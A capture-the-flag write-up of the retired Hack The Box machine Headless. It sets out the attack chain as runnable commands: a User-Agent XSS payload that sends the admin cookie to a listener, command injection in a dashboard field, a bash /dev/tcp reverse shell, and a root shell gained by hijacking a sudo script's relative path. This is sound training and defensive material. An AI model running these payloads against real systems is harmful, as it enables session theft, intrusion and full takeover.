---
title: "Hack The Box — Headless"
summary: "Headless turns a blind User-Agent XSS into an admin cookie, command injection, a dvir shell, and root through a sudo script's relative-path call."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Easy"
os: "Linux"
solvedAt: 2026-11-26
publishedAt: 2026-11-26
tags:
  - web-enumeration
  - blind-xss
  - cookie-theft
  - command-injection
  - reverse-shell
  - sudo
  - relative-path-hijacking
  - privilege-escalation
tools:
  - Nmap
  - curl
  - Python
  - Netcat
cves: []
htbUrl: "https://app.hackthebox.com/machines/594"
cover: "/images/writeups/hackthebox/machines/headless/headless.png"
coverAlt: "Hack The Box Headless machine artwork: a headless figure inside a green circle"
featured: false
draft: false
---

> This write-up documents an authorized Hack The Box lab. [Hack The Box lists Headless as a retired machine](https://www.hackthebox.com/machines/headless), meeting its [write-up publication rule](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines). Flag values, the captured admin cookie, and session-specific VPN addresses are omitted. Use the values from your own instance.

## Executive summary

Headless exposes a Python Werkzeug web application on port 5000. Its support form saves a report when the message contains HTML-like input, including the request headers. An unsanitized `User-Agent` in that report executes JavaScript when the administrator reviews it. The script sends back the administrator's `is_admin` cookie, which unlocks `/dashboard`. The dashboard passes its `date` parameter into a shell command, giving a reverse shell as `dvir`. Finally, `dvir` can run `/usr/bin/syscheck` with `sudo`; the script executes `./initdb.sh` from the caller's current directory, so a controlled file runs as root.

## Target information

| Item | Value |
| --- | --- |
| Target | Headless |
| Platform | Hack The Box |
| Difficulty | Easy |
| Operating system | Linux |
| Publication policy | Retired; [HTB machine page](https://www.hackthebox.com/machines/headless) |
| Solved | 26 November 2026 |
| Main weaknesses | Blind XSS, command injection, relative-path execution under `sudo` |

Start the machine and connect Kali to the HTB VPN. Replace `YOUR_TARGET_IP` with the address assigned to your instance. The commands below obtain `LHOST` from Kali's `tun0` interface; check that this is the VPN interface you are using.

```bash
TARGET="YOUR_TARGET_IP"
LHOST=$(ip -4 -o addr show tun0 | awk '{print $4}' | cut -d/ -f1)
printf 'Target: %s\nVPN IP: %s\n' "$TARGET" "$LHOST"
```

## Enumeration

### Service scan

Scan every TCP port and probe the discovered services:

```bash
nmap "$TARGET" -T5 -sCV -p-
```

My scan found only these open TCP ports:

```text
22/tcp    open  ssh   OpenSSH 9.2p1 Debian 2+deb12u2
5000/tcp  open  http  Werkzeug httpd 2.2.2 (Python 3.11.2)
```

Nmap reported that some probes hit the retransmission cap at `-T5`. The scan still identified the web service, but if results are inconsistent, repeat the relevant probes at a slower timing. Port 5000 serves plain HTTP:

```bash
curl -I "http://$TARGET:5000/"
```

An HTTPS request to this port fails with `SSL_ERROR_RX_RECORD_TOO_LONG`. Enter the full `http://` URL if a browser upgrades the address automatically.

### Web routes and the user cookie

The home page is an "Under Construction" page with a link to `/support`. Its response sets an `is_admin` cookie for a normal user. Save that cookie and use it when checking `/dashboard`:

```bash
curl -sS -D - -o /dev/null -c user.cookies "http://$TARGET:5000/"
curl -sS -o /dev/null -w 'Support: %{http_code}\n' "http://$TARGET:5000/support"
curl -sS -o /dev/null -w 'Dashboard: %{http_code}\n' -b user.cookies "http://$TARGET:5000/dashboard"
```

The normal user receives HTTP 401 from `/dashboard`. The support form collects first name, last name, email, phone, and message. Sending angle brackets in `message` produces a **Hacking Attempt Detected** response. Crucially, that response includes a report of the request headers and says the report was sent to administrators. This gives us a reason to test whether a header is rendered unsafely when an administrator reviews it.

## Initial access

### Blind XSS through `User-Agent`

Open a callback listener in one Kali terminal:

```bash
python3 -m http.server 8000
```

In another terminal, set `TARGET` and `LHOST` again if this is a new shell, then submit the support request. The HTML-like message causes a report to be saved; the JavaScript payload is in the **`User-Agent` header**, supplied by `curl -A`:

```bash
TARGET="YOUR_TARGET_IP"
LHOST=$(ip -4 -o addr show tun0 | awk '{print $4}' | cut -d/ -f1)

curl -sS "http://$TARGET:5000/support" \
  -A "<script>new Image().src='http://$LHOST:8000/?c='+encodeURIComponent(document.cookie)</script>" \
  --data-urlencode 'fname=test' \
  --data-urlencode 'lname=test' \
  --data-urlencode 'email=test@example.com' \
  --data-urlencode 'phone=1234567890' \
  --data-urlencode 'message=<>'
```

Confirm that the response contains **Hacking Attempt Detected** and that the displayed report contains the injected `User-Agent`. When the administrator's browser views the stored report, `new Image()` makes a GET request to your listener. Its URL contains the browser's cookies, for example:

```text
GET /?c=is_admin%3D<ADMIN_COOKIE> HTTP/1.1
```

`%3D` is the URL-encoded `=` between the cookie name and value. It is **not** part of the cookie value. Save the captured value in a shell variable without the URL encoding or a duplicated `is_admin=` prefix:

```bash
COOKIE='is_admin=<ADMIN_COOKIE>'
```

The callback proves that JavaScript ran in the administrator's browser. The cookie works because the application exposes `is_admin` to `document.cookie` rather than marking it `HttpOnly`.

### Command injection in the dashboard

The admin cookie grants access to the report generator on `/dashboard`. Its POST body has a `date` field. Append `;id` to test whether the value reaches a shell:

```bash
curl -sS -b "$COOKIE" -X POST \
  --data-urlencode 'date=2023-09-15;id' \
  "http://$TARGET:5000/dashboard"
```

The returned report includes `uid=1000(dvir)`, confirming command execution as the local user `dvir`. Here, `;` ends the application's report command and starts `id` as another shell command.

For an interactive shell, start a second listener in another Kali terminal:

```bash
nc -lvnp 4444
```

Then send the reverse shell using the same cookie and the VPN IP obtained earlier:

```bash
curl -sS -b "$COOKIE" -X POST \
  --data-urlencode "date=2023-09-15;bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'" \
  "http://$TARGET:5000/dashboard"
```

The `curl` request may remain open while the shell is active. In the Netcat terminal, verify the user and locate the user proof without publishing its value:

```bash
id
ls -l /home/dvir/user.txt
```

The initial reverse shell may warn that it has no job control. If a command needs a terminal, spawn a pseudo-terminal first:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege escalation

### Inspect the delegated script

As `dvir`, read the local mail, list `sudo` permissions, and inspect the permitted script:

```bash
cat /var/mail/dvir
sudo -l
cat /usr/bin/syscheck
```

The mail mentions a new system check script and an unfinished database initialization script. `sudo -l` allows `dvir` to run `/usr/bin/syscheck` as root without a password. Near the end of `syscheck`, the relevant branch is:

```bash
if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
fi
```

The commands above it use absolute paths, but `./initdb.sh` does not. Because `sudo` runs `syscheck` as root while preserving the caller's working directory, `./initdb.sh` resolves to a file we can place in a directory we control. The `pgrep` condition must take the branch that starts the script.

### Run a controlled `initdb.sh` as root

Create a fresh directory, write an executable script there, and call the permitted program **from that directory**:

```bash
cd "$(mktemp -d)"
printf '#!/bin/bash\nexec /bin/bash -p -i\n' > initdb.sh
chmod +x initdb.sh
sudo /usr/bin/syscheck
```

`syscheck` invokes our `./initdb.sh`, which replaces itself with an interactive Bash process running as root. Verify the result and locate the root proof:

```bash
id
ls -l /root/root.txt
```

The expected identity is `uid=0(root)`. If `sudo` reports a terminal error, use the Python pseudo-terminal command above and rerun it from the directory containing `initdb.sh`.

## What did not work

- Opening port 5000 with HTTPS produced `SSL_ERROR_RX_RECORD_TOO_LONG`; the service required an explicit `http://` URL.
- The first dashboard request combined a URL-encoded, duplicated `is_admin` prefix with an unset `$TARGET`, so it did not reach a valid authenticated endpoint. Decoding the cookie and setting the variables in the sending shell fixed the request.

## Attack path

1. Nmap identifies SSH and a Werkzeug HTTP application on port 5000.
2. `/support` saves a suspicious request report containing unsanitized headers.
3. JavaScript in `User-Agent` executes during administrator review and sends back `is_admin`.
4. The admin cookie opens `/dashboard`; its `date` field permits shell command injection.
5. A reverse shell lands as `dvir`.
6. `sudo` permits `/usr/bin/syscheck`, whose relative `./initdb.sh` call runs our file as root.

## Lessons learned

- Headers are untrusted input. Escape them before displaying incident reports, and avoid exposing session cookies to JavaScript when the application does not require it.
- Validate and pass report parameters as data rather than interpolating them into a shell command. The successful `;id` probe showed exactly where the boundary failed.
- A `sudo` allowlist entry can still be dangerous when the permitted program invokes a relative path. Resolve supporting files from a fixed, root-owned directory and reject writable working directories.

## References

- [Hack The Box: Headless machine and retired status](https://www.hackthebox.com/machines/headless)
- [Hack The Box: write-up publication guidelines](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines)
- [OWASP Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
